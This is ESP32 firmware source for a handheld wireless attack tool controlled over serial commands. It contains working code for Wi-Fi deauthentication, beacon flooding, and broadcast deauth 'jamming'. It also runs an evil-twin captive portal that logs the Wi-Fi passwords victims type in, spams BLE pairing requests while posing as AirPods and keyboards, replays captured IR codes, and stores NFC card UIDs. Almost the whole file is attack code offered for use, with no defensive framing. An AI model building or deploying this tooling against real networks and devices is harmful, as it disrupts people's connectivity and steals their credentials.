#include <Arduino.h>
#include <WiFi.h>
// Use ESP32 built-in BLE library
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEServer.h>
#include <IRremote.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <SPI.h>
#include <MFRC522.h>

// MFRC522 pins
#define RST_PIN     22
#define SS_PIN      21

// File to store NFC UIDs
#define NFC_UID_FILE "/nfc_uids.txt"

// NFC module
MFRC522 mfrc522(SS_PIN, RST_PIN);
bool nfcInitialized = false;
String lastCapturedUID = "";
#define MAX_SAVED_UIDS 10
String savedUIDs[MAX_SAVED_UIDS];
int savedUIDCount = 0;

// Serial communication settings
#define SERIAL_BAUD_RATE 115200
#define MAX_COMMAND_LENGTH 128
char commandBuffer[MAX_COMMAND_LENGTH];
int bufferPos = 0;

// Attack state flags
bool attackRunning = false;
String currentAttack = "";

// IR setup
#define IR_SEND_PIN 4
#define IR_RECV_PIN 5
IRsend irsender(IR_SEND_PIN);
IRrecv irrecv(IR_RECV_PIN);
decode_results irResults;
uint32_t lastIRCode = 0;

// BLE scan settings
BLEScan* bleScan = NULL;
int bleScanTime = 5; // seconds
BLEServer* pServer = NULL;
BLEService* pService = NULL;
BLEAdvertising* pAdvertising = NULL;
bool deviceConnected = false;

// WiFi settings
DNSServer dnsServer;
WebServer webServer(80);
const byte DNS_PORT = 53;
String apSSID = "Free-WiFi";
String apPassword = "12345678";

// Deauth frame structure
uint8_t deauthFrame[26] = {
  0xC0, 0x00,                         // Frame Control
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination address (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source address
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Sequence number
  0x01, 0x00                          // Reason code (1 = unspecified)
};

// Beacon frame template
uint8_t beaconPacket[109] = {
  0x80, 0x00,                         // Frame Control
  0x00, 0x00,                         // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address (broadcast)
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, // Source address (random)
  0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, // BSSID (random)
  0x00, 0x00,                         // Sequence number
  // Fixed parameters
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval
  0x01, 0x04,                         // Capability info
  // Tagged parameters
  0x00, 0x20,                         // SSID parameter (length to be set)
  // SSID (to be filled)
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, // Supported rates
  0x03, 0x01, 0x01                    // Channel
};

// Function prototypes
void executeWifiScan();
void executeDeauth(const String& mac);
void executeBeaconFlood(const String& ssidPrefix, const String& count);
void executeWifiJam(const String& channel);
void executeEvilTwin(const String& targetSSID, const String& channel);
void executeBtScan();
void executeBtSpamPair();
void executeIrSend(const String& code);
void executeIrCapture();
void executeIrReplay();
void stopAllAttacks();
void processCommand(const String& command);
void executeNfcInit();
void executeNfcScan();
void executeNfcSave(const String& name);
void executeNfcList();
void executeNfcClear();
void handleRoot();
void handleLogin();
void handleNotFound();
String uidToString(MFRC522::Uid uid);
void loadSavedUIDs();
void saveUIDsToFlash();
String loadPortalHTML();
void setup() {
    // Initialize serial communication
    Serial.begin(SERIAL_BAUD_RATE);
    delay(1000);
    
    // Initialize WiFi
    WiFi.mode(WIFI_STA);
    
    // Initialize BLE
    BLEDevice::init("");
    bleScan = BLEDevice::getScan();
    bleScan->setActiveScan(true);
    
    // Initialize IR
    irsender.begin(IR_SEND_PIN);
    irrecv.enableIRIn();
    
    // Initialize SPI for MFRC522
    SPI.begin();
    
    // Initialize SPIFFS
    if (!SPIFFS.begin(true)) {
      Serial.println(F("ERROR:SPIFFS_INIT_FAILED"));
    } else {
      // Load saved UIDs from flash
      loadSavedUIDs();
    }
    
    Serial.println(F("READY"));
  }

void loop() {
  // Check for incoming serial commands
  while (Serial.available() > 0) {
    char c = Serial.read();
    
    if (c == '\n' || c == '\r') {
      if (bufferPos > 0) {
        commandBuffer[bufferPos] = '\0';
        processCommand(String(commandBuffer));
        bufferPos = 0;
      }
    } else if (bufferPos < MAX_COMMAND_LENGTH - 1) {
      commandBuffer[bufferPos++] = c;
    }
  }
  
  // Check for IR code if capturing
  if (currentAttack == "IR_CAPTURE" && irrecv.decode(&irResults)) {
    lastIRCode = irResults.value;
    Serial.println("IR_CAPTURE:CODE:" + String(lastIRCode, HEX));
    irrecv.resume();
  }
  
  // Handle DNS for Evil Twin attack
  if (currentAttack == "EVIL_TWIN") {
    dnsServer.processNextRequest();
    webServer.handleClient();
  }
  
  delay(10);
}

void processCommand(const String& command) {
  String cmd = command;
  cmd.trim();
  cmd.toUpperCase();
  
  // Check for STOP command first
  if (cmd == "STOP") {
    stopAllAttacks();
    return;
  }
  
  if (cmd.startsWith("WIFI SCAN")) {
    executeWifiScan();
  } 
  else if (cmd.startsWith("WIFI DEAUTH ")) {
    String mac = cmd.substring(12);
    mac.trim();
    executeDeauth(mac);
  }
  else if (cmd.startsWith("WIFI BEACON ")) {
    // Format: WIFI BEACON <prefix> <count>
    int firstSpace = cmd.indexOf(' ', 12);
    if (firstSpace > 0) {
      String prefix = cmd.substring(12, firstSpace);
      String count = cmd.substring(firstSpace + 1);
      executeBeaconFlood(prefix, count);
    } else {
      Serial.println("ERROR:INVALID_PARAMETERS");
    }
  }
  else if (cmd.startsWith("WIFI JAM ")) {
    String channel = cmd.substring(9);
    channel.trim();
    executeWifiJam(channel);
  }
  else if (cmd.startsWith("WIFI EVILTWIN ")) {
    // Format: WIFI EVILTWIN <ssid> <channel>
    int firstSpace = cmd.indexOf(' ', 13);
    if (firstSpace > 0) {
      String ssid = cmd.substring(13, firstSpace);
      String channel = cmd.substring(firstSpace + 1);
      executeEvilTwin(ssid, channel);
    } else {
      Serial.println("ERROR:INVALID_PARAMETERS");
    }
  }
  else if (cmd.startsWith("BT SCAN")) {
    executeBtScan();
  }
  else if (cmd.startsWith("BT SPAMPAIR")) {
    executeBtSpamPair();
  }
  else if (cmd.startsWith("IR SEND ")) {
    String code = cmd.substring(8);
    code.trim();
    executeIrSend(code);
  }
  else if (cmd.startsWith("IR CAPTURE")) {
    executeIrCapture();
  }
  else if (cmd.startsWith("IR REPLAY")) {
    executeIrReplay();
  }
  else if (cmd == "NFC INIT") {
    executeNfcInit();
  }
  else if (cmd == "NFC SCAN") {
    executeNfcScan();
  }
  else if (cmd.startsWith("NFC SAVE ")) {
    String name = cmd.substring(9);
    name.trim();
    executeNfcSave(name);
  }
  else if (cmd == "NFC LIST") {
    executeNfcList();
  }
  else if (cmd == "NFC CLEAR") {
    executeNfcClear();
  }
  else if (cmd == "NFC LOAD") {
    loadSavedUIDs();
  }
  else {
    Serial.println("ERROR:INVALID_COMMAND");
  }
}

// Stop all running attacks
void stopAllAttacks() {
  if (!attackRunning) {
    Serial.println("STATUS:NO_ATTACK_RUNNING");
    return;
  }
  
  Serial.println("STOP:" + currentAttack);
  
  // Reset WiFi
  if (currentAttack.startsWith("WIFI_")) {
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
    
    if (currentAttack == "WIFI_EVILTWIN") {
      webServer.stop();
      dnsServer.stop();
    }
  }
  
  // Reset BT
  // Reset BT
  if (currentAttack.startsWith("BT_")) {
    // Clean up previous BLE connections
    if (pServer != NULL) {
      // No direct deinit in ESP32 BLE, but we can re-init
      BLEDevice::init("");
      bleScan = BLEDevice::getScan();
      bleScan->setActiveScan(true);
    }
  }
  
  // Reset IR
  if (currentAttack.startsWith("IR_")) {
    if (currentAttack == "IR_CAPTURE") {
      irrecv.disableIRIn();
    }
  }
  
  attackRunning = false;
  currentAttack = "";
  Serial.println("STATUS:STOPPED");
}

// WiFi Functions
void executeWifiScan() {
  Serial.println("WIFI_SCAN:START");
  
  int networks = WiFi.scanNetworks(false, true, false, 300);
  
  if (networks == 0) {
    Serial.println("WIFI_SCAN:NO_NETWORKS");
  } else {
    Serial.println("WIFI_SCAN:FOUND:" + String(networks));
    
    for (int i = 0; i < networks; i++) {
      String mac = WiFi.BSSIDstr(i);
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      int channel = WiFi.channel(i);
      
      Serial.println("WIFI_NETWORK:" + mac + ":" + ssid + ":" + String(rssi) + ":" + String(channel));
      delay(10);
    }
    
    Serial.println("WIFI_SCAN:COMPLETE");
  }
  
  WiFi.scanDelete();
}

void executeDeauth(const String& macStr) {
  Serial.println("WIFI_DEAUTH:START:" + macStr);
  currentAttack = "WIFI_DEAUTH";
  attackRunning = true;
  
  // Convert MAC string to bytes
  uint8_t mac[6];
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  
  // Set target MAC in deauth frame
  memcpy(&deauthFrame[4], mac, 6);  // Destination
  memcpy(&deauthFrame[16], mac, 6); // BSSID
  
  // Switch to monitor mode
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  // Set channel (scanning through all channels)
  for (int ch = 1; ch <= 11; ch++) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    
    // Send deauth frames
    for (int i = 0; i < 5; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
      delay(5);
    }
    
    Serial.println("WIFI_DEAUTH:CHANNEL:" + String(ch));
  }
  
  // Switch back to station mode
  esp_wifi_set_promiscuous(false);
  
  attackRunning = false;
  currentAttack = "";
  Serial.println("WIFI_DEAUTH:COMPLETE");
}

void executeBeaconFlood(const String& ssidPrefix, const String& count) {
  Serial.println("WIFI_BEACON:START:" + ssidPrefix + ":" + count);
  currentAttack = "WIFI_BEACON";
  attackRunning = true;
  
  int numSSIDs = count.toInt();
  if (numSSIDs < 1 || numSSIDs > 50) {
    numSSIDs = 10; // Default to 10 if invalid
  }
  
  // Switch to monitor mode
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  
  // Send beacon frames for each fake AP
  for (int i = 0; i < 100 && attackRunning; i++) { // Send 100 rounds of beacons or until stopped
    for (int ap = 0; ap < numSSIDs && attackRunning; ap++) {
      // Create SSID
      String ssid = ssidPrefix + String(ap);
      
      // Set SSID in beacon frame
      uint8_t ssidLen = ssid.length();
      beaconPacket[37] = ssidLen; // Set SSID length
      
      // Copy SSID into packet
      for (int j = 0; j < ssidLen; j++) {
        beaconPacket[38 + j] = ssid[j];
      }
      
      // Generate random MAC for this AP
      for (int j = 0; j < 6; j++) {
        beaconPacket[10 + j] = random(256);
        beaconPacket[16 + j] = beaconPacket[10 + j];
      }
      
      // Set random channel (1-11)
      int channel = random(1, 12);
      beaconPacket[82] = channel;
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
      
      // Send packet
      esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + 26, false);
      
      delay(1);
    }
    
    // Status update every 10 rounds
    if (i % 10 == 0) {
      Serial.println("WIFI_BEACON:STATUS:" + String(i) + "%");
    }
    
    delay(100);
  }
  
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  
  attackRunning = false;
  currentAttack = "";
  Serial.println("WIFI_BEACON:COMPLETE");
}

void executeWifiJam(const String& channel) {
  Serial.println("WIFI_JAM:START:" + channel);
  currentAttack = "WIFI_JAM";
  attackRunning = true;
  
  int ch = channel.toInt();
  if (ch < 1 || ch > 14) {
    ch = 1; // Default to channel 1 if invalid
  }
  
  // Switch to monitor mode
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  
  // Prepare deauth frame for broadcast
  memset(&deauthFrame[4], 0xFF, 6);
  // Jam by sending continuous deauth frames to broadcast address
  int packetsSent = 0;
  
  while (attackRunning && packetsSent < 1000) {
    // Send deauth frames to broadcast
    for (int i = 0; i < 50 && attackRunning; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
      packetsSent++;
      delay(1);
    }
    
    Serial.println("WIFI_JAM:PACKETS:" + String(packetsSent));
    delay(50);
  }
  
  // Disable promiscuous mode
  esp_wifi_set_promiscuous(false);
  
  if (!attackRunning) {
    Serial.println("WIFI_JAM:STOPPED");
  } else {
    attackRunning = false;
    currentAttack = "";
    Serial.println("WIFI_JAM:COMPLETE");
  }
}

// Function to load the captive portal HTML from SPIFFS
String loadPortalHTML() {
  if (!SPIFFS.exists(F("/portal.html"))) {
    return F("<html><body><h1>Error: Portal file not found</h1></body></html>");
  }
  File file = SPIFFS.open(F("/portal.html"), "r");
  if (!file) {
    return F("<html><body><h1>Error: Cannot open portal file</h1></body></html>");
  }
  String html = file.readString();
  file.close();
  return html;
}

void executeEvilTwin(const String& targetSSID, const String& channel) {
  Serial.println("WIFI_EVILTWIN:START:" + targetSSID);
  currentAttack = "WIFI_EVILTWIN";
  attackRunning = true;
  
  int ch = channel.toInt();
  if (ch < 1 || ch > 14) {
    ch = 1; // Default to channel 1 if invalid
  }
  
  // Set up access point with target SSID
  WiFi.mode(WIFI_AP);
  WiFi.softAP(targetSSID.c_str(), "", ch);
  
  // Start DNS server to capture all DNS requests
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  // Set up web server
  // Set up web server
  webServer.on("/", HTTP_GET, handleRoot);
  webServer.on("/login", HTTP_GET, handleLogin);
  webServer.on("/login", HTTP_POST, []() {
    String password = webServer.arg("password");
    Serial.println("WIFI_EVILTWIN:PASSWORD:" + password);
    webServer.send(200, "text/html", "<html><body><h1>Connecting...</h1><p>Please wait while we verify your credentials...</p></body></html>");
  });
  webServer.onNotFound(handleNotFound);
  
  webServer.begin();
  
  Serial.println("WIFI_EVILTWIN:RUNNING:AP_IP:" + WiFi.softAPIP().toString());
  
  // Evil Twin will continue running until stopped via STOP command
  // The loop() function will handle DNS and web server requests
}
// Helper functions for web server requests
void handleRoot() {
  webServer.sendHeader("Location", "/login", true);
  webServer.send(302, "text/plain", "");
}

void handleLogin() {
  webServer.send(200, F("text/html"), loadPortalHTML());
}

void handleNotFound() {
  webServer.sendHeader("Location", "/login", true);
  webServer.send(302, "text/plain", "");
}

void executeBtScan() {
  Serial.println("BT_SCAN:START");
  
  BLEScanResults* foundResults = bleScan->start(bleScanTime, false);
  
  // Get discovered devices
  int deviceCount = foundResults->getCount();
  
  for (int i = 0; i < deviceCount; i++) {
    BLEAdvertisedDevice device = foundResults->getDevice(i);
    String address = device.getAddress().toString().c_str();
    String name = device.haveName() ? device.getName().c_str() : "UNKNOWN";
    int rssi = device.getRSSI();
    
    Serial.println("BT_DEVICE:" + address + ":" + name + ":" + String(rssi));
    delay(10);
  }
  
  Serial.println("BT_SCAN:FOUND:" + String(deviceCount));
  
  bleScan->clearResults();
  Serial.println("BT_SCAN:COMPLETE");
}
// BLE connection callback handler
class MyServerCallbacks: public BLEServerCallbacks {
  void onConnect(BLEServer* pServer) {
    deviceConnected = true;
    Serial.println("BT_SPAMPAIR:DEVICE_CONNECTED");
  }

  void onDisconnect(BLEServer* pServer) {
    deviceConnected = false;
    Serial.println("BT_SPAMPAIR:DEVICE_DISCONNECTED");
  }
};

void executeBtSpamPair() {
  Serial.println("BT_SPAMPAIR:START");
  currentAttack = "BT_SPAMPAIR";
  attackRunning = true;
  
  // Create a bunch of devices with different names to spam pairing requests
  const char* const deviceNames[] = {
    "AirPods",
    "Bose QC",
    "Sony WH",
    "KB",
    "Mouse",
    "Watch"
  };
  const uint8_t numDeviceNames = 6;
  
  int spamCount = 0;
  int nameIndex = 0;
  while (attackRunning && spamCount < 100) {
    // Create a new device with a different name
    const char* deviceName = deviceNames[nameIndex % numDeviceNames];
    nameIndex++;
    BLEDevice::init(deviceName);
    
    // Create server and set callbacks
    pServer = BLEDevice::createServer();
    pServer->setCallbacks(new MyServerCallbacks());
    
    // Create a service with a recognizable UUID for HID devices
    pService = pServer->createService("1812"); // HID service
    pService->start();
    
    // Start advertising
    pAdvertising = pServer->getAdvertising();
    pAdvertising->addServiceUUID("1812");
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMinPreferred(0x12);
    pAdvertising->start();
    
    
    String statusMsg = "BT_SPAMPAIR:ADVERTISING:";
    statusMsg += deviceName;
    Serial.println(statusMsg);
    // Advertise for a few seconds
    for (int i = 0; i < 10 && attackRunning; i++) {
      delay(300);
    }
    
    spamCount++;
  }
  
  // Clean up - Re-initialize BLE for scanning
  BLEDevice::init("");
  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  
  attackRunning = false;
  currentAttack = "";
  Serial.println("BT_SPAMPAIR:COMPLETE");
}

// IR Functions
void executeIrSend(const String& code) {
  Serial.println("IR_SEND:START:" + code);
  
  // Parse hex code
  uint32_t irCode;
  if (code.startsWith("0x")) {
    irCode = strtoul(code.c_str() + 2, NULL, 16);
  } else {
    irCode = strtoul(code.c_str(), NULL, 16);
  }
  
  // Send IR code (NEC protocol as default)
  irsender.sendNEC(irCode, 32);
  
  Serial.println("IR_SEND:COMPLETE");
}

void executeIrCapture() {
  Serial.println("IR_CAPTURE:START");
  currentAttack = "IR_CAPTURE";
  attackRunning = true;
  
  // Enable IR receiver
  irrecv.enableIRIn();
  
  // Reset last captured code
  lastIRCode = 0;
  
  Serial.println("IR_CAPTURE:WAITING");
  
  // Capturing will continue in the loop() function until stopped
  // When a code is received, it will be printed with IR_CAPTURE:CODE:XXXXXX
}

void executeIrReplay() {
  Serial.println("IR_REPLAY:START");
  
  if (lastIRCode == 0) {
    Serial.println("IR_REPLAY:ERROR:NO_CODE_CAPTURED");
    return;
  }
  
  Serial.println("IR_REPLAY:CODE:" + String(lastIRCode, HEX));
  
  // Send the last captured IR code
  irsender.sendNEC(lastIRCode, 32);
  
  Serial.println("IR_REPLAY:COMPLETE");
}

void executeNfcInit() {
    Serial.println("NFC_INIT:START");
    
    mfrc522.PCD_Init();
    delay(100);
    
    // Check if MFRC522 is responding
    byte version = mfrc522.PCD_ReadRegister(mfrc522.VersionReg);
    if (version == 0x00 || version == 0xFF) {
      Serial.println("NFC_INIT:ERROR:READER_NOT_FOUND");
      nfcInitialized = false;
      return;
    }
    
    nfcInitialized = true;
    Serial.println("NFC_INIT:COMPLETE:VERSION:" + String(version, HEX));
  }
  
  // Convert UID bytes to string
String uidToString(MFRC522::Uid uid) {
    String result = "";
    for (byte i = 0; i < uid.size; i++) {
      if (i > 0) result += ":";
      if (uid.uidByte[i] < 0x10) result += "0";
      result += String(uid.uidByte[i], HEX);
    }
    result.toUpperCase();
    return result;
  }

void executeNfcScan() {
    if (!nfcInitialized) {
      Serial.println("NFC_SCAN:ERROR:NOT_INITIALIZED");
      return;
    }
    
    Serial.println("NFC_SCAN:START");
    currentAttack = "NFC_SCAN";
    attackRunning = true;
    
    // Set a timeout
    unsigned long startTime = millis();
    const unsigned long timeout = 15000; // 15 seconds timeout
    
    while (attackRunning && (millis() - startTime < timeout)) {
      // Check if a new card is present
      if (!mfrc522.PICC_IsNewCardPresent()) {
        delay(50);
        continue;
      }
      
      // Select one of the cards
      if (!mfrc522.PICC_ReadCardSerial()) {
        delay(50);
        continue;
      }
      
      // Get card info
      String uid = uidToString(mfrc522.uid);
      MFRC522::PICC_Type piccType = mfrc522.PICC_GetType(mfrc522.uid.sak);
      String type = mfrc522.PICC_GetTypeName(piccType);
      
      Serial.println("NFC_SCAN:FOUND:UID:" + uid + ":TYPE:" + type);
      lastCapturedUID = uid;
      
      // Halt PICC and stop encryption
      mfrc522.PICC_HaltA();
      mfrc522.PCD_StopCrypto1();
      
      // Wait a bit before scanning again
      delay(500);
    }
    
    attackRunning = false;
    currentAttack = "";
    
    if (millis() - startTime >= timeout) {
      Serial.println("NFC_SCAN:TIMEOUT");
    } else {
      Serial.println("NFC_SCAN:COMPLETE");
    }
  }
  
// Save UIDs to flash memory
void saveUIDsToFlash() {
    File file = SPIFFS.open(NFC_UID_FILE, FILE_WRITE);
    if (!file) {
      Serial.println("NFC_SAVE:ERROR:CANNOT_OPEN_FILE");
      return;
    }
    
    for (int i = 0; i < savedUIDCount; i++) {
      file.println(savedUIDs[i]);
    }
    
    file.close();
    Serial.println("NFC_SAVE:FLASH:COMPLETE");
  }
  
  // Load saved UIDs from flash memory
void loadSavedUIDs() {
    if (!SPIFFS.exists(NFC_UID_FILE)) {
      savedUIDCount = 0;
      return;
    }
    
    File file = SPIFFS.open(NFC_UID_FILE, FILE_READ);
    if (!file) {
      Serial.println("ERROR:CANNOT_OPEN_FILE");
      return;
    }
    
    savedUIDCount = 0;
    while (file.available() && savedUIDCount < MAX_SAVED_UIDS) {
      String line = file.readStringUntil('\n');
      line.trim();
      if (line.length() > 0) {
        savedUIDs[savedUIDCount++] = line;
      }
    }
    
    file.close();
    Serial.println("NFC_LOAD:FLASH:COMPLETE:COUNT:" + String(savedUIDCount));
  }
  
  // Save the last captured UID with a name
void executeNfcSave(const String& name) {
    if (lastCapturedUID == "") {
      Serial.println("NFC_SAVE:ERROR:NO_UID_CAPTURED");
      return;
    }
    
    if (savedUIDCount >= MAX_SAVED_UIDS) {
      Serial.println("NFC_SAVE:ERROR:STORAGE_FULL");
      return;
    }
    
    // Save the UID with the given name
    savedUIDs[savedUIDCount] = name + ":" + lastCapturedUID;
    savedUIDCount++;
    
    // Save to flash memory
    saveUIDsToFlash();
    
    Serial.println("NFC_SAVE:COMPLETE:NAME:" + name + ":UID:" + lastCapturedUID);
  }
  
void executeNfcList() {
    Serial.println("NFC_LIST:COUNT:" + String(savedUIDCount));
    
    for (int i = 0; i < savedUIDCount; i++) {
      Serial.println("NFC_LIST:ENTRY:" + String(i) + ":" + savedUIDs[i]);
    }
    
    Serial.println("NFC_LIST:COMPLETE");
  }
  // Clear all saved UIDs
void executeNfcClear() {
    savedUIDCount = 0;
    lastCapturedUID = "";
    
    // Clear flash storage
    if (SPIFFS.exists(NFC_UID_FILE)) {
      SPIFFS.remove(NFC_UID_FILE);
    }
    
    Serial.println("NFC_CLEAR:COMPLETE");
  }